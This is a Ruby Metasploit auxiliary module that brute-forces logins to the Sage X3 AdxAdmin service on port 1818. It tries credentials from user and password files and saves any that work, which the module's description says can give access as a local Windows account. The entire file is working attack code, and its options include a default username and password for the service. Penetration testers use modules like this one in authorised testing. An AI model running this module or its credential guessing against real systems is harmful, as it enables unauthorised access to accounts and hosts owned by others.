require 'metasploit/framework/login_scanner/x3'
require 'metasploit/framework/credential_collection'
class MetasploitModule < Msf::Auxiliary
  Rank = GreatRanking

  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::AuthBrute
  include Msf::Exploit::Remote::Tcp


  def initialize(info = {})
    super(
      'Name'           => 'Sage X3 AdxAdmin Login Scanner',
      'Description'    => %q{
      This module allows an attacker to perform a password guessing attack against
      the Sage X3 AdxAdmin service which in turn can be used to authenticate against
      as a local windows account.

      This module implements the X3Crypt function to 'encrypt' any passwords to
      be used during the authentication process, provided a plaintext password.
      },
      'Author'         => ['Jonathan Peterson <deadjakk[at]shell.rip>'], #@deadjakk
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          [ 'URL', 'https://www.rapid7.com/blog/post/2021/07/07/cve-2020-7387-7390-multiple-sage-x3-vulnerabilities/'],
        ]
      )

    register_options(
      [
        Opt::RPORT(1818),
        OptString.new("USERNAME",[false,'User with which to authenticate to the AdxAdmin service','x3admin']),
        OptString.new("PASSWORD",[false,'Plaintext password with which to authenticate','s@ge2020'])
      ])

    deregister_options('PASSWORD_SPRAY')
    deregister_options('BLANK_PASSWORDS')

  end # initialize
 
  def target
    "#{rhost}:#{rport}"
  end 

  def run_host(ip)
    cred_collection = Metasploit::Framework::CredentialCollection.new(
      blank_passwords: false,
      pass_file: datastore['PASS_FILE'],
      password: datastore['PASSWORD'],
      user_file: datastore['USER_FILE'],
      userpass_file: datastore['USERPASS_FILE'],
      username: datastore['USERNAME'],
      user_as_pass: datastore['USER_AS_PASS']
    )

    scanner = Metasploit::Framework::LoginScanner::X3.new(
      host: ip,
      port: rport,
      cred_details: cred_collection,
      stop_on_success: datastore['STOP_ON_SUCCESS'],
      bruteforce_speed: datastore['BRUTEFORCE_SPEED'],
      max_send_size: datastore['TCP::max_send_size'],
      send_delay: datastore['TCP::send_delay'],
      framework: framework,
      framework_module: self,
      local_port: datastore['CPORT'],
      local_host: datastore['CHOST']
    )

    scanner.scan! do |result|
      credential_data = result.to_h
      credential_data.merge!(
          module_fullname: self.fullname,
          workspace_id: myworkspace_id
      )
      case result.status
      when Metasploit::Model::Login::Status::SUCCESSFUL
        print_brute :level => :good, :ip => ip, :msg => "Success: '#{result.credential}'"
        credential_core = create_credential(credential_data)
        credential_data[:core] = credential_core
        create_credential_login(credential_data)
        next
      when Metasploit::Model::Login::Status::UNABLE_TO_CONNECT
        if datastore['VERBOSE']
          print_brute :level => :verror, :ip => ip, :msg => "Could not connect: #{result.proof}"
        end
      when Metasploit::Model::Login::Status::INCORRECT
        if datastore['VERBOSE']
          print_brute :level => :verror, :ip => ip, :msg => "Failed: '#{result.credential}'"
        end
      end 

      invalidate_login(credential_data)
    end # case
  end # run_host
end
